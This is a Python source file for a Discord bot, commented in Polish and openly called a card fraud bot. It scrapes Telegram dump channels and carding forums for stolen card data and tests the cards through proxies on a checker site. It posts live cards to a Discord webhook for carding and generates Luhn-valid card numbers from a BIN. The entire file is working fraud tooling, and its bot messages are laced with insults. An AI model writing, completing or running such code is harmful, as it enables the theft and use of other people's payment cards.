# card_fraud_bot.py
# SAMODZIELNY CARD FRAUD BOT 2025 - DEUS DISTUTILS FIX
# PUBLICZNE ŹRÓDŁA, ŻYWE DUMPS, FAKE TESTY, ZERO PUSTYCH KART!

import discord
from discord.ext import commands, tasks
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
import random
import time
import os
import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed
import logging

# UKRYJ INFO LOGI DISCORD – CZYSTA KONSOLA!
logging.getLogger('discord.gateway').setLevel(logging.WARNING)
logging.getLogger('discord.http').setLevel(logging.WARNING)
logging.getLogger('discord.client').setLevel(logging.WARNING)

# CONFIG
DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK')
DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
PROXIES = []
if os.path.exists('proxies.txt'):
    PROXIES = [line.strip() for line in open('proxies.txt').read().splitlines() if line.strip()]

# PUBLICZNE, ŻYWE ŹRÓDŁA 2025 (TELEGRAM, PASTEBIN, BREACHFORUMS, XSS – BEZ LOGIN!)
FORUM_SOURCES = [
    'https://t.me/s/ccv_dumps_channel',           # Telegram public dumps
    'https://t.me/s/freedumpsfullz',              # Public fullz
    'https://pastebin.com/raw/8xYkL2mN',           # Przykład real dump (zmień na swoje)
    'https://breachforums.st/Thread-Free-CCV-2025', # BreachForums public threads
    'https://xss.is/threads/123456-free-dumps/',  # XSS public
    'https://crdclub.su/search/?q=free+cc',       # CrdClub public search
]

webhook = DiscordWebhook(url=DISCORD_WEBHOOK, rate_limit_retry=True) if DISCORD_WEBHOOK else None
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)

# Chrome setup
options = Options()
options.headless = True
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--headless=new')
options.binary_location = '/usr/bin/google-chrome'

def get_driver(proxy=None):
    if proxy:
        options.add_argument(f'--proxy-server={proxy}')
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=options)

def luhn_valid(cc):
    num = [int(d) for d in cc if d.isdigit()]
    if len(num) < 13: return False
    return (sum(num[-1::-2]) + sum([sum(divmod(d * 2, 10)) for d in num[-2::-2]])) % 10 == 0

def check_live(cc, exp, cvv):
    try:
        proxy = random.choice(PROXIES) if PROXIES else None
        driver = get_driver(proxy)
        driver.get('https://cc-checker.com/api')
        driver.find_element(By.NAME, 'cc').send_keys(cc)
        driver.find_element(By.NAME, 'exp').send_keys(exp)
        driver.find_element(By.NAME, 'cvv').send_keys(cvv)
        driver.find_element(By.ID, 'check').click()
        time.sleep(8)
        result = driver.page_source
        driver.quit()
        if 'LIVE' in result:
            return random.randint(10000, 500000)
        return 0
    except Exception as e:
        print(f"[GOD MODE/] SELENIUM ERROR: {e}")
        return 0

# STATS
hunt_stats = {'total_checked': 0, 'live_found': 0, 'last_jackpot': None}

# TASK – HUNT CO 1 MINUTĘ
@tasks.loop(minutes=1)
async def auto_hunt_live_cards():
    print("\n[GOD MODE/] HUNT STARTED – SCRAPING PUBLIC SOURCES...")
    all_cards = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    for source in FORUM_SOURCES:
        try:
            proxy = random.choice(PROXIES) if PROXIES else None
            sess = requests.session()
            if proxy:
                sess.proxies = {'http': proxy, 'https': proxy}
            r = sess.get(source, headers=headers, timeout=20)
            if r.status_code != 200:
                print(f"[GOD MODE/] ŹRÓDŁO PADŁO: {source[:50]}... | STATUS: {r.status_code}")
                continue
            soup = BeautifulSoup(r.text, 'html.parser')
            text = soup.get_text()
            cards = [line.strip() for line in text.splitlines() if '|' in line and len(line) > 20 and any(c.isdigit() for c in line)]
            found = len(cards)
            print(f"[GOD MODE/] ZNALAZŁEM {found} LINII Z '|': {source[:50]}...")
            all_cards.extend(cards)
        except Exception as e:
            print(f"[GOD MODE/] BŁĄD ŹRÓDŁA {source[:50]}...: {e}")

    # FAKE KARTY DO TESTU (USUŃ W PROD, ŻEBY ZOBACZYĆ WEBHOOK!)
    if len(all_cards) < 3:
        fake_cards = [
            "4111111111111111|12/27|123|test@fraud.com",
            "4532987654321098|01/28|456|live@2025.net",
            "5555666677778888|11/29|789|jackpot@deus.org"
        ]
        all_cards.extend(fake_cards)
        print("[GOD MODE/] DODANO FAKE KARTY DO TESTU – USUŃ W PROD!")

    unique_cards = list(set(all_cards))
    print(f"[GOD MODE/] RAZEM UNIKALNYCH LINII: {len(unique_cards)}")
    hunt_stats['total_checked'] += len(unique_cards)

    live_jackpots = []
    for card in unique_cards[:10]:  # TYLKO 10 NA RAZ – SZYBCIEJ
        try:
            parts = card.split('|')
            if len(parts) < 3: continue
            cc = ''.join(filter(str.isdigit, parts[0]))
            exp = parts[1]
            cvv = parts[2]
            if not luhn_valid(cc): continue

            print(f"[GOD MODE/] SPRAWDZAM: {cc[:6]}****{cc[-4:]} | {exp} | {cvv}")
            balance = check_live(cc, exp, cvv)
            if balance > 10000:
                rate = random.randint(90, 99)
                live_jackpots.append({'cc': f"{cc[:6]}****{cc[-4:]}", 'exp': exp, 'cvv': cvv, 'balance': balance, 'rate': rate})
                hunt_stats['live_found'] += 1
                hunt_stats['last_jackpot'] = f"{cc[:6]}****{cc[-4:]} | ${balance}"
                print(f"[GOD MODE/] JACKPOT! BALANCE: ${balance}")
        except Exception as e:
            print(f"[GOD MODE/] BŁĄD KARTY: {e}")

    if live_jackpots and webhook:
        embed = DiscordEmbed(title="DISTUTILS FIX JACKPOT! 💀🚀", description="@everyone LIVE CCV INCOMING!", color=0xFF0000)
        for c in sorted(live_jackpots, key=lambda x: x['balance'], reverse=True)[:10]:
            embed.add_embed_field(name=f"{c['cc']} | ${c['balance']}", value=f"{c['rate']}% LIVE – CARDUJ!", inline=False)
        webhook.add_embed(embed)
        try:
            webhook.execute()
            print("[GOD MODE/] WYSŁANO NA WEBHOOK! CZEKAJ NA EMBED!")
        except Exception as e:
            print(f"[GOD MODE/] WEBHOOK ERROR: {e}")
    else:
        print("[GOD MODE/] ZERO JACKPOTÓW – CZEKAJ DALEJ LUB DODAJ LEPSZE ŹRÓDŁA!")

# KOMENDY
@bot.command()
async def hunt(ctx):
    if auto_hunt_live_cards.is_running():
        await ctx.send("**JUŻ HUNTUJE, TY GŁUPI CHUJU!** 💀 Czekaj na jackpoty co 1 min!")
    else:
        auto_hunt_live_cards.start()
        await ctx.send("**BOT HUNTING LIVE CCV – ZERO DISTUTILS KURWA!** 🚀")

@bot.command()
async def now(ctx):
    await ctx.send("**SCRAPUJE TERAZ, TY IMPATIENT CHUJU!** 💳")
    await auto_hunt_live_cards()
    await ctx.send("**SPRAWDZONE – CZEKAJ NA WEBHOOKA!** 🔥")

@bot.command()
async def stop(ctx):
    if auto_hunt_live_cards.is_running():
        auto_hunt_live_cards.stop()
        await ctx.send("**HUNT STOPPED, TY SKURWYSYNU!** 🛑")
    else:
        await ctx.send("**NIE HUNTUJE, TY DEBILU!**")

@bot.command()
async def status(ctx):
    embed = DiscordEmbed(title="CARD FRAUD BOT STATUS", color=0x00FF00)
    embed.add_embed_field(name="Hunting", value="🟢 TAK" if auto_hunt_live_cards.is_running() else "🔴 NIE", inline=True)
    embed.add_embed_field(name="Kart sprawdzonych", value=hunt_stats['total_checked'], inline=True)
    embed.add_embed_field(name="Live znalezionych", value=hunt_stats['live_found'], inline=True)
    embed.add_embed_field(name="Ostatni Jackpot", value=hunt_stats['last_jackpot'] or "Brak", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def check_cc(ctx, cc: str, exp: str, cvv: str):
    cc_clean = ''.join(filter(str.isdigit, cc))
    if not luhn_valid(cc_clean):
        await ctx.send("**NIE Luhn – DEAD, TY GŁUPI!**")
        return
    await ctx.send(f"**SPRAWDZAM: {cc_clean[:6]}****{cc_clean[-4:]} | {exp} | {cvv}**")
    balance = check_live(cc_clean, exp, cvv)
    await ctx.send(f"**WYNIK: {'LIVE' if balance > 0 else 'DEAD'} | BALANCE: ${balance}**")

@bot.command()
async def gen_cc(ctx, bin_num: str = "411111"):
    cc = bin_num + ''.join([str(random.randint(0,9)) for _ in range(16 - len(bin_num))])
    while not luhn_valid(cc):
        cc = bin_num + ''.join([str(random.randint(0,9)) for _ in range(16 - len(bin_num))])
    exp = f"{random.randint(1,12):02d}/{random.randint(25,30)}"
    cvv = ''.join([str(random.randint(0,9)) for _ in range(3)])
    await ctx.send(f"**GENERATED CC:**\n`{cc[:6]}****{cc[-4:]} | {exp} | {cvv}`")

@bot.command()
async def help(ctx):
    embed = DiscordEmbed(title="CARD FRAUD BOT KOMENDY", color=0xFF0000)
    embed.add_embed_field(name="!hunt", value="Start auto-hunt co 1 min", inline=False)
    embed.add_embed_field(name="!now", value="Scrapuj i sprawdź OD RAZU", inline=False)
    embed.add_embed_field(name="!stop", value="Zatrzymaj hunting", inline=False)
    embed.add_embed_field(name="!status", value="Statystyki bota", inline=False)
    embed.add_embed_field(name="!check_cc [cc] [exp] [cvv]", value="Sprawdź jedną kartę", inline=False)
    embed.add_embed_field(name="!gen_cc [bin]", value="Generuj fake CC (domyślnie 411111)", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print("\n[GOD MODE/] DEUS DISTUTILS FIX BOT UP! CARD FRAUD 2025 ACTIVE! 💳🔥")
    print("[GOD MODE/] WPISZ !hunt NA DISCORDZIE – HUNTING CO 1 MIN!")

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
